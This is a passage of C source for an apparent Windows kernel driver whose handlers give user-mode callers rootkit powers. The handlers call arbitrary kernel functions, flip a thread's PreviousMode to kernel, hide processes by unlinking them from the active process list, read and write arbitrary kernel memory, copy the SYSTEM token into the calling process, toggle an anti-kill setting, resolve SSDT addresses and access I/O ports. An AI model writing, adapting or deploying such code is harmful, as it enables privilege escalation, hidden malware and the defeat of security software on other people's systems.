        stackMem = ExAllocatePoolWithTag(NonPagedPool, stackSize, '0SR0');
        if (!stackMem) return STATUS_INSUFFICIENT_RESOURCES;
        RtlCopyMemory(stackMem, &Args[4], stackSize);
    }

    __try {
        switch (Argc) {
            case 0:  ret = ((PFN_0)ApiAddress)(); break;
            case 1:  ret = ((PFN_1)ApiAddress)(Args[0]); break;
            case 2:  ret = ((PFN_2)ApiAddress)(Args[0], Args[1]); break;
            case 3:  ret = ((PFN_3)ApiAddress)(Args[0], Args[1], Args[2]); break;
            case 4:  ret = ((PFN_4)ApiAddress)(Args[0], Args[1], Args[2], Args[3]); break;
            case 5:  ret = ((PFN_5)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0]); break;
            case 6:  ret = ((PFN_6)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1]); break;
            case 7:  ret = ((PFN_7)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2]); break;
            case 8:  ret = ((PFN_8)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3]); break;
            case 9:  ret = ((PFN_9)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4]); break;
            case 10: ret = ((PFN_10)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5]); break;
            case 11: ret = ((PFN_11)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6]); break;
            case 12: ret = ((PFN_12)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7]); break;
            case 13: ret = ((PFN_13)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8]); break;
            case 14: ret = ((PFN_14)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9]); break;
            case 15: ret = ((PFN_15)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9], ((UINT64*)stackMem)[10]); break;
            case 16: ret = ((PFN_16)ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9], ((UINT64*)stackMem)[10], ((UINT64*)stackMem)[11]); break;
            default: status = STATUS_NOT_SUPPORTED;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (ReturnValue) *ReturnValue = ret;
    if (stackMem) ExFreePoolWithTag(stackMem, '0SR0');
    return status;
}

static NTSTATUS PreviousModeSwitch(PVOID InputBuffer, ULONG InputSize,
                                   PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    PPREVIOUS_MODE_SWITCH_INPUT pInput;
    PETHREAD pEThread;
    PUCHAR pPrevMode;
    UCHAR oldMode = 0;
    UCHAR newMode = 0;
    PPREVIOUS_MODE_SWITCH_OUTPUT pOutput;

    if (InputSize < sizeof(PREVIOUS_MODE_SWITCH_INPUT) || !InputBuffer)
        return STATUS_INVALID_PARAMETER;
    if (OutputSize < sizeof(PREVIOUS_MODE_SWITCH_OUTPUT))
        return STATUS_BUFFER_TOO_SMALL;

    pInput = (PPREVIOUS_MODE_SWITCH_INPUT)InputBuffer;
    pEThread = PsGetCurrentThread();
    if (!pEThread) return STATUS_UNSUCCESSFUL;

    pPrevMode = (PUCHAR)pEThread + g_PreviousModeOffset;

    __try {
        oldMode = *pPrevMode;
        newMode = oldMode;
        if (pInput->ViewOnly == 0) {
            if (pInput->Mode != R0SPMS_MODE_KERNEL && pInput->Mode != R0SPMS_MODE_USER) {
                status = STATUS_INVALID_PARAMETER;
            } else {
                newMode = pInput->Mode;
                *pPrevMode = newMode;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (NT_SUCCESS(status)) {
        pOutput = (PPREVIOUS_MODE_SWITCH_OUTPUT)OutputBuffer;
        pOutput->Status = STATUS_SUCCESS;
        pOutput->OldMode = oldMode;
        pOutput->NewMode = newMode;
        *Info = sizeof(PREVIOUS_MODE_SWITCH_OUTPUT);
    }
    return status;
}

static NTSTATUS ProcessHiding(PVOID InputBuffer, ULONG InputSize,
                              PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    PPROCESS_HIDING_INPUT pIn;
    UCHAR op;

    if (!InputBuffer || InputSize < sizeof(PROCESS_HIDING_INPUT))
        return STATUS_INVALID_PARAMETER;

    pIn = (PPROCESS_HIDING_INPUT)InputBuffer;
    op = pIn->Operation;
    if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE && op != R0SKPH_OP_LIST)
        return STATUS_INVALID_PARAMETER;

    if (op == R0SKPH_OP_ADD) {
        PEPROCESS pTarget = NULL;
        PHIDDEN_PROCESS_ENTRY pEntry;
        ULONG pid;
        KIRQL oldIrql;
        BOOLEAN alreadyHidden = FALSE;
        PLIST_ENTRY pLink;

        if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
            return STATUS_BUFFER_TOO_SMALL;
        pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
        if (pid == 0) return STATUS_INVALID_PARAMETER;

        status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pTarget);
        if (!NT_SUCCESS(status)) return status;

        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
        {
            PLIST_ENTRY pList = g_HiddenListHead.Flink;
            while (pList != &g_HiddenListHead) {
                PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) { alreadyHidden = TRUE; break; }
                pList = pList->Flink;
            }
        }
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

        if (alreadyHidden) { ObDereferenceObject(pTarget); return STATUS_ALREADY_COMMITTED; }

        pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(
            NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
        if (!pEntry) { ObDereferenceObject(pTarget); return STATUS_INSUFFICIENT_RESOURCES; }
        RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
        pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
        pEntry->EProcess = pTarget;

        pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
        __try { RemoveEntryList(pLink); } __except(EXCEPTION_EXECUTE_HANDLER) {}

        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
        InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

        if (OutputSize >= sizeof(NTSTATUS)) { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; *Info = sizeof(NTSTATUS); }
        else *Info = 0;
        return STATUS_SUCCESS;
    }

    if (op == R0SKPH_OP_REMOVE) {
        ULONG pid;
        KIRQL oldIrql;
        PHIDDEN_PROCESS_ENTRY pEntry = NULL;
        PEPROCESS pProc;
        PLIST_ENTRY pLink, pSysLink;
        PEPROCESS pSys;

        if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
            return STATUS_BUFFER_TOO_SMALL;
        pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
        if (pid == 0) return STATUS_INVALID_PARAMETER;

        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
        {
            PLIST_ENTRY pList = g_HiddenListHead.Flink;
            while (pList != &g_HiddenListHead) {
                PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
                    pEntry = pCur;
                    RemoveEntryList(&pEntry->ListEntry);
                    break;
                }
                pList = pList->Flink;
            }
        }
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

        if (!pEntry) {
            if (OutputSize >= sizeof(NTSTATUS)) { *(NTSTATUS*)OutputBuffer = STATUS_NOT_FOUND; *Info = sizeof(NTSTATUS); }
            else *Info = 0;
            return STATUS_NOT_FOUND;
        }

        pProc = pEntry->EProcess;
        if (pProc) {
            pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
            pSys = PsInitialSystemProcess;
            pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
            __try { InsertHeadList(pSysLink, pLink); } __except(EXCEPTION_EXECUTE_HANDLER) {}
            ObDereferenceObject(pProc);
        }
        ExFreePoolWithTag(pEntry, 'HIDE');

        if (OutputSize >= sizeof(NTSTATUS)) { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; *Info = sizeof(NTSTATUS); }
        else *Info = 0;
        return STATUS_SUCCESS;
    }

    
    {
        ULONG maxCount = 0;
        KIRQL oldIrql;
        ULONG count = 0;
        PLIST_ENTRY pList;

        if (OutputSize >= sizeof(ULONG))
            maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);

        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
        pList = g_HiddenListHead.Flink;
        while (pList != &g_HiddenListHead && count < maxCount) {
            PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
            ((HANDLE*)((PUCHAR)OutputBuffer + sizeof(ULONG)))[count] = pCur->ProcessId;
            count++;
            pList = pList->Flink;
        }
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

        if (OutputSize >= sizeof(ULONG)) { *(ULONG*)OutputBuffer = count; *Info = sizeof(ULONG) + count * sizeof(HANDLE); }
        else { *Info = 0; return STATUS_BUFFER_TOO_SMALL; }
        return STATUS_SUCCESS;
    }
}

static NTSTATUS KernelMemoryAccess(PVOID InputBuffer, ULONG InputSize,
                                   PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    PKERNEL_MEMORY_ACCESS_INPUT pIn;
    PVOID target, dataBuffer;
    NTSTATUS opStatus = STATUS_SUCCESS;

    if (InputSize < sizeof(KERNEL_MEMORY_ACCESS_INPUT) || !InputBuffer)
        return STATUS_INVALID_PARAMETER;

    pIn = (PKERNEL_MEMORY_ACCESS_INPUT)InputBuffer;
    if (pIn->Length == 0 || (pIn->Operation != R0SKMA_OP_READ && pIn->Operation != R0SKMA_OP_WRITE))
        return STATUS_INVALID_PARAMETER;
    if (InputSize < sizeof(KERNEL_MEMORY_ACCESS_INPUT) + pIn->Length)
        return STATUS_BUFFER_TOO_SMALL;
    if (pIn->Operation == R0SKMA_OP_READ && OutputSize < sizeof(KERNEL_MEMORY_ACCESS_INPUT) + pIn->Length)
        return STATUS_BUFFER_TOO_SMALL;

    target = (PVOID)((ULONG_PTR)pIn->Address + pIn->Offset);
    dataBuffer = pIn->Data;

    __try {
        if (pIn->Operation == R0SKMA_OP_READ) RtlCopyMemory(dataBuffer, target, pIn->Length);
        else RtlCopyMemory(target, dataBuffer, pIn->Length);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        opStatus = GetExceptionCode();
    }

    *Info = sizeof(KERNEL_MEMORY_ACCESS_INPUT) + pIn->Length;
    return opStatus;
}

static NTSTATUS GetSystemToken(PVOID InputBuffer, ULONG InputSize,
                               PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE systemProcessHandle = NULL;
    HANDLE tokenHandle = NULL;
    HANDLE dupTokenHandle = NULL;
    PEPROCESS targetProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;
    PGET_SYSTEM_TOKEN_INPUT pIn = NULL;
    PGET_SYSTEM_TOKEN_OUTPUT pOut = NULL;
    PROCESS_ACCESS_TOKEN accessToken;
    UCHAR savedByte = 0;

    RtlZeroMemory(&accessToken, sizeof(accessToken));

    if (InputSize < sizeof(GET_SYSTEM_TOKEN_INPUT) || !InputBuffer ||
        OutputSize < sizeof(GET_SYSTEM_TOKEN_OUTPUT)) {
        return STATUS_INVALID_PARAMETER;
    }
    pIn = (PGET_SYSTEM_TOKEN_INPUT)InputBuffer;
    pOut = (PGET_SYSTEM_TOKEN_OUTPUT)OutputBuffer;
    if (g_PrimaryTokenFrozenOffset == 0) return STATUS_UNSUCCESSFUL;

    targetProcess = PsGetCurrentProcess();
    if (!targetProcess) return STATUS_UNSUCCESSFUL;

    __try {
        InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        clientId.UniqueProcess = (HANDLE)4;
        clientId.UniqueThread = NULL;
        status = ZwOpenProcess(&systemProcessHandle, PROCESS_QUERY_INFORMATION, &objAttr, &clientId);
        if (!NT_SUCCESS(status)) __leave;

        status = ZwOpenProcessToken(systemProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &tokenHandle);
        if (!NT_SUCCESS(status)) __leave;

        status = ZwDuplicateToken(tokenHandle, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &dupTokenHandle);
        if (!NT_SUCCESS(status)) __leave;

        if (pIn->ReplaceToken) {
            __try {
                savedByte = ((PUCHAR)targetProcess)[g_PrimaryTokenFrozenOffset];
                ((PUCHAR)targetProcess)[g_PrimaryTokenFrozenOffset] = 0x50;
            } __except(EXCEPTION_EXECUTE_HANDLER) { status = GetExceptionCode(); __leave; }

            accessToken.Token = dupTokenHandle;
            accessToken.Thread = NULL;
            status = ZwSetInformationProcess(ZwCurrentProcess(), ProcessAccessToken, &accessToken, sizeof(accessToken));

            __try { ((PUCHAR)targetProcess)[g_PrimaryTokenFrozenOffset] = savedByte; }
            __except(EXCEPTION_EXECUTE_HANDLER) {}

            if (NT_SUCCESS(status)) {
                pOut->Status = STATUS_SUCCESS;
                pOut->TokenHandle = NULL;
                ZwClose(dupTokenHandle); dupTokenHandle = NULL;
            } else {
                pOut->Status = status;
                pOut->TokenHandle = NULL;
            }
        } else {
            pOut->Status = STATUS_SUCCESS;
            pOut->TokenHandle = dupTokenHandle;
            dupTokenHandle = NULL;
        }
        *Info = sizeof(GET_SYSTEM_TOKEN_OUTPUT);
        status = STATUS_SUCCESS;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (!NT_SUCCESS(status)) {
        if (OutputSize >= sizeof(GET_SYSTEM_TOKEN_OUTPUT) && pOut) {
            pOut->Status = status;
            pOut->TokenHandle = NULL;
            *Info = sizeof(GET_SYSTEM_TOKEN_OUTPUT);
        }
    }
    if (systemProcessHandle) ZwClose(systemProcessHandle);
    if (tokenHandle) ZwClose(tokenHandle);
    if (dupTokenHandle) ZwClose(dupTokenHandle);
    return status;
}

static NTSTATUS SetInternalVariables(PVOID InputBuffer, ULONG InputSize,
                                     PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    PSET_INTERNAL_VAR_INPUT pIn;
    ULONG op;

    if (!InputBuffer || InputSize < sizeof(SET_INTERNAL_VAR_INPUT))
        return STATUS_INVALID_PARAMETER;

    pIn = (PSET_INTERNAL_VAR_INPUT)InputBuffer;
    op = pIn->Operation;
    if (op != R0SIMULATE_VAR_OP_GET &&
        op != R0SIMULATE_VAR_OP_SET &&
        op != R0SIMULATE_VAR_OP_LIST)
        return STATUS_INVALID_PARAMETER;
    if (op == R0SIMULATE_VAR_OP_LIST) {
        ULONG count = 0;
        KIRQL oldIrql;
        ULONG required;
        PVAR_INFO pOutVar;
        PLIST_ENTRY p;
        ULONG idx;

        KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
        for (p = g_VarTableHead.Flink; p != &g_VarTableHead; p = p->Flink) {
            PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
            ULONG bit = e->Id - 1;
            if (bit < 64 && (g_HideAttrDescriptor & ((UINT64)1 << bit)))
                continue;
            count++;
        }
        KeReleaseSpinLock(&g_VarTableLock, oldIrql);

        required = sizeof(ULONG) + count * sizeof(VAR_INFO);
        if (OutputSize < required) {
            *Info = required;
            return STATUS_BUFFER_TOO_SMALL;
        }

        *(ULONG*)OutputBuffer = count;
        pOutVar = (PVAR_INFO)((PUCHAR)OutputBuffer + sizeof(ULONG));
        KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
        idx = 0;
        p = g_VarTableHead.Flink;
        while (p != &g_VarTableHead && idx < count) {
            PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
            UINT64 val = 0;
            ULONG  bit = e->Id - 1;
            if (bit < 64 && (g_HideAttrDescriptor & ((UINT64)1 << bit))) {
                p = p->Flink;
                continue;
            }

            pOutVar[idx].Id   = e->Id;
            pOutVar[idx].Size = e->Size;

            if (bit < 64 && (g_ReadAttrDescriptor & ((UINT64)1 << bit))) {
                val = 0xC0000022ULL;
            } else {
                if (e->Size == sizeof(ULONG))       val = *(ULONG*)e->Address;
                else if (e->Size == sizeof(UINT64)) val = *(UINT64*)e->Address;
                else RtlCopyMemory(&val, e->Address, e->Size);
            }

            pOutVar[idx].Value = val;
            R0sWcsCopyN(pOutVar[idx].Name, e->Name, 32);
            idx++;
            p = p->Flink;
        }
        KeReleaseSpinLock(&g_VarTableLock, oldIrql);
        *Info = required;
        return STATUS_SUCCESS;
    }
    {
        PVAR_TABLE_ENTRY target = NULL;
        ULONG            bit    = 0;

        if (pIn->NameLength > 0) {
            PWCHAR pName;
            ULONG  chars;
            if (InputSize < sizeof(SET_INTERNAL_VAR_INPUT) + pIn->NameLength)
                return STATUS_BUFFER_TOO_SMALL;
            pName = (PWCHAR)((PUCHAR)pIn + sizeof(SET_INTERNAL_VAR_INPUT));
            chars = pIn->NameLength / sizeof(WCHAR);
            if (chars > 0 && pName[chars - 1] == L'\0') chars--;
            target = FindVarByName(pName, chars);
        } else {
            target = FindVarById(pIn->VariableId);
        }
        if (!target) return STATUS_INVALID_PARAMETER;

        bit = target->Id - 1;

        if (bit < 64 && (g_ReadAttrDescriptor & ((UINT64)1 << bit)))
            return STATUS_ACCESS_DENIED;

        if (op == R0SIMULATE_VAR_OP_SET &&
            bit < 64 && (g_WriteAttrDescriptor & ((UINT64)1 << bit)))
            return STATUS_ACCESS_DENIED;

        if (op == R0SIMULATE_VAR_OP_GET) {
            UINT64 val = 0;
            if (OutputSize < sizeof(UINT64)) return STATUS_BUFFER_TOO_SMALL;
            if (target->Size == sizeof(ULONG))       val = *(ULONG*)target->Address;
            else if (target->Size == sizeof(UINT64)) val = *(UINT64*)target->Address;
            else RtlCopyMemory(&val, target->Address, target->Size);
            *(UINT64*)OutputBuffer = val;
            *Info = sizeof(UINT64);
            return STATUS_SUCCESS;
        }

        if (target->Address == (PVOID)(ULONG_PTR)&g_FunctionLookupMode) {
            if (pIn->Value != 0 && pIn->Value != 1 && pIn->Value != 2)
                return STATUS_INVALID_PARAMETER;
        }
        if (target->Address == (PVOID)(ULONG_PTR)&g_GetFunctionMode) {
            if (pIn->Value != 0 && pIn->Value != 1)
                return STATUS_INVALID_PARAMETER;
        }

        if (target->Size == sizeof(ULONG))       *(ULONG*)target->Address = (ULONG)pIn->Value;
        else if (target->Size == sizeof(UINT64)) *(UINT64*)target->Address = pIn->Value;
        else RtlCopyMemory(target->Address, &pIn->Value, target->Size);

        if (target->Address == (PVOID)(ULONG_PTR)&g_AntiKill) UpdateAntiKill();

        *Info = 0;
    }
    return status;
}

static NTSTATUS GetKernelFunction(PVOID InputBuffer, ULONG InputSize,
                                  PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    KIRQL oldIrql;

    if (g_GetFunctionMode == 0) {
        if (!g_FunctionTableBuilt) {
            BOOLEAN needBuild = FALSE;
            KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
            if (!g_FunctionTableBuilt) needBuild = TRUE;
            KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

            if (needBuild) {
                status = LazyBuildFunctionTable();
                if (!NT_SUCCESS(status)) { *Info = 0; return status; }
                KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                g_FunctionTableBuilt = TRUE;
                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
            }
        }

        if (InputSize < sizeof(ULONG) || !InputBuffer) return STATUS_INVALID_PARAMETER;
        {
            PGET_KERNEL_FUNCTION_INPUT pIn = (PGET_KERNEL_FUNCTION_INPUT)InputBuffer;
            ULONG nameLen = pIn->NameLength;
            if (nameLen > 0) {
                UNICODE_STRING uniName;
                UINT64 address = 0;
                PLIST_ENTRY pList;

                if (InputSize < sizeof(GET_KERNEL_FUNCTION_INPUT) + nameLen - 1) return STATUS_BUFFER_TOO_SMALL;
                if (OutputSize < sizeof(UINT64)) return STATUS_BUFFER_TOO_SMALL;

                RtlInitUnicodeString(&uniName, pIn->Name);
                KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                pList = g_FunctionTableHead.Flink;
                while (pList != &g_FunctionTableHead) {
                    PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
                    if (RtlCompareUnicodeString(&pNode->Name, &uniName, TRUE) == 0) {
                        address = (UINT64)(ULONG_PTR)pNode->Address;
                        break;
                    }
                    pList = pList->Flink;
                }
                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                if (address == 0) return STATUS_NOT_FOUND;
                *(UINT64*)OutputBuffer = address;
                *Info = sizeof(UINT64);
                return STATUS_SUCCESS;
            } else {
                ULONG count = 0;
                ULONG requiredSize;
                PKERNEL_FUNCTION_ENTRY pEntry;
                PLIST_ENTRY pList;
                ULONG idx;

                KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                pList = g_FunctionTableHead.Flink;
                while (pList != &g_FunctionTableHead) { count++; pList = pList->Flink; }
                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

                requiredSize = sizeof(ULONG) + count * sizeof(KERNEL_FUNCTION_ENTRY);
                if (OutputSize < requiredSize) { *Info = requiredSize; return STATUS_BUFFER_TOO_SMALL; }

                *(ULONG*)OutputBuffer = count;
                pEntry = (PKERNEL_FUNCTION_ENTRY)((PUCHAR)OutputBuffer + sizeof(ULONG));

                KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                pList = g_FunctionTableHead.Flink;
                idx = 0;
                while (pList != &g_FunctionTableHead && idx < count) {
                    PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
                    ULONG nameLenChars = (pNode->Name.Length / sizeof(WCHAR));
                    pEntry[idx].Address = (UINT64)(ULONG_PTR)pNode->Address;
                    if (nameLenChars >= 64) nameLenChars = 63;
                    RtlCopyMemory(pEntry[idx].Name, pNode->Name.Buffer, nameLenChars * sizeof(WCHAR));
                    pEntry[idx].Name[nameLenChars] = L'\0';
                    idx++;
                    pList = pList->Flink;
                }
                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                *Info = requiredSize;
                return STATUS_SUCCESS;
            }
        }
    } else {
        if (!g_SsdtBuilt) {
            status = BuildSsdtTable();
            if (!NT_SUCCESS(status)) { *Info = 0; return status; }
        }
        if (InputSize < sizeof(ULONG) || !InputBuffer) return STATUS_INVALID_PARAMETER;
        {
            PGET_KERNEL_FUNCTION_INPUT pIn = (PGET_KERNEL_FUNCTION_INPUT)InputBuffer;
            ULONG nameLen = pIn->NameLength;
            if (nameLen > 0) {
                const WCHAR* name;
                PSSDT_ENTRY entry = NULL;
                if (InputSize < sizeof(GET_KERNEL_FUNCTION_INPUT) + nameLen - 1) return STATUS_BUFFER_TOO_SMALL;
                name = pIn->Name;
                if (IsNumberString(name)) entry = FindSsdtBySsn(WcharToUlong(name));
                else entry = FindSsdtByName(name);
                if (!entry) return STATUS_NOT_FOUND;
                if (OutputSize >= sizeof(KERNEL_FUNCTION_ENTRY)) {
                    PKERNEL_FUNCTION_ENTRY pOut = (PKERNEL_FUNCTION_ENTRY)OutputBuffer;
                    pOut->Address = entry->Address;
                    R0sWcsCopyN(pOut->Name, entry->Name, 64);
                    *Info = sizeof(KERNEL_FUNCTION_ENTRY);
                    return STATUS_SUCCESS;
                } else return STATUS_BUFFER_TOO_SMALL;
            } else {
                ULONG count = 0;
                ULONG required;
                PSSDT_ENTRY_INFO pOut;
                PLIST_ENTRY pList;
                ULONG idx;

                KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
                pList = g_SsdtListHead.Flink;
                while (pList != &g_SsdtListHead) { count++; pList = pList->Flink; }
                KeReleaseSpinLock(&g_SsdtListLock, oldIrql);

                required = sizeof(ULONG) + count * sizeof(SSDT_ENTRY_INFO);
                if (OutputSize < required) { *Info = required; return STATUS_BUFFER_TOO_SMALL; }

                *(ULONG*)OutputBuffer = count;
                pOut = (PSSDT_ENTRY_INFO)((PUCHAR)OutputBuffer + sizeof(ULONG));

                KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
                pList = g_SsdtListHead.Flink;
                idx = 0;
                while (pList != &g_SsdtListHead && idx < count) {
                    PSSDT_ENTRY e = CONTAINING_RECORD(pList, SSDT_ENTRY, ListEntry);
                    pOut[idx].Ssn = e->Ssn;
                    pOut[idx].Address = e->Address;
                    R0sWcsCopyN(pOut[idx].Name, e->Name, 64);
                    idx++;
                    pList = pList->Flink;
                }
                KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
                *Info = required;
                return STATUS_SUCCESS;
            }
        }
    }
}

static NTSTATUS IoPortOperation(PVOID InputBuffer, ULONG InputSize,
                                PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS status = STATUS_SUCCESS;
    PR0S_IO_INPUT pIn;
    PR0S_IO_OUTPUT pOut;
    ULONG port;
    ULONG value = 0;
    BOOLEAN writeOp = FALSE;
    BOOLEAN validOp = TRUE;

    if (InputSize < sizeof(R0S_IO_INPUT) || !InputBuffer) return STATUS_INVALID_PARAMETER;
    if (OutputSize < sizeof(R0S_IO_OUTPUT)) return STATUS_BUFFER_TOO_SMALL;

    pIn = (PR0S_IO_INPUT)InputBuffer;
    pOut = (PR0S_IO_OUTPUT)OutputBuffer;
    port = pIn->Port;

    __try {
        switch (pIn->Operation) {
            case R0SIO_READ_BYTE:  value = READ_PORT_UCHAR((PUCHAR)(ULONG_PTR)port); break;
            case R0SIO_READ_WORD:  value = READ_PORT_USHORT((PUSHORT)(ULONG_PTR)port); break;
            case R0SIO_READ_DWORD: value = READ_PORT_ULONG((ULONG*)(ULONG_PTR)port); break;
            case R0SIO_WRITE_BYTE:  WRITE_PORT_UCHAR((PUCHAR)(ULONG_PTR)port, (UCHAR)pIn->Value);  writeOp = TRUE; break;
            case R0SIO_WRITE_WORD:  WRITE_PORT_USHORT((PUSHORT)(ULONG_PTR)port, (USHORT)pIn->Value); writeOp = TRUE; break;
            case R0SIO_WRITE_DWORD: WRITE_PORT_ULONG((ULONG*)(ULONG_PTR)port, pIn->Value); writeOp = TRUE; break;
            default: validOp = FALSE; break;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        validOp = FALSE;
    }

    if (!validOp && NT_SUCCESS(status)) return STATUS_INVALID_PARAMETER;
    if (!NT_SUCCESS(status)) return status;

    pOut->Status = STATUS_SUCCESS;
    pOut->Value = writeOp ? 0 : value;
    *Info = sizeof(R0S_IO_OUTPUT);
    return STATUS_SUCCESS;
}

